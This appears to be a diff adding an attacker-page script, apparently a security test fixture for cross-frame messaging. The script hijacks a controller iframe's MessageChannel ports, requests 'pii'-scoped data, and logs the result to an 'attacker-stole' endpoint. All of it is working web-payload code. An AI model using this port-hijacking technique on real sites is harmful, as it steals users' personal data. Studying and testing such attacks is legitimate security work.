@@ -1,0 +1,21 @@
+<script>
+  // Takes the controller frame's ports, or sends the controller frame its own.
+  const report = (m) => fetch(location.origin + "/log?attacker-stole-" + encodeURIComponent(JSON.stringify(m.data)));
+  const controllerFrame = document.querySelector("html > iframe");
+  addEventListener("message", (e) => {
+    const control = e.ports[0];
+    if (!control) return;
+    const mint = new MessageChannel();
+    mint.port1.onmessage = report;
+    control.postMessage({ scope: "pii" }, [mint.port2]);
+  }, true);
+  document.addEventListener("load", (e) => {
+    if (e.target !== controllerFrame) return;
+    e.stopImmediatePropagation();
+    const control = new MessageChannel();
+    const mint = new MessageChannel();
+    mint.port1.onmessage = report;
+    control.port1.postMessage({ scope: "pii" }, [mint.port2]);
+    controllerFrame.contentWindow.postMessage(null, "*", [control.port2]);
+  }, true);
+</script>
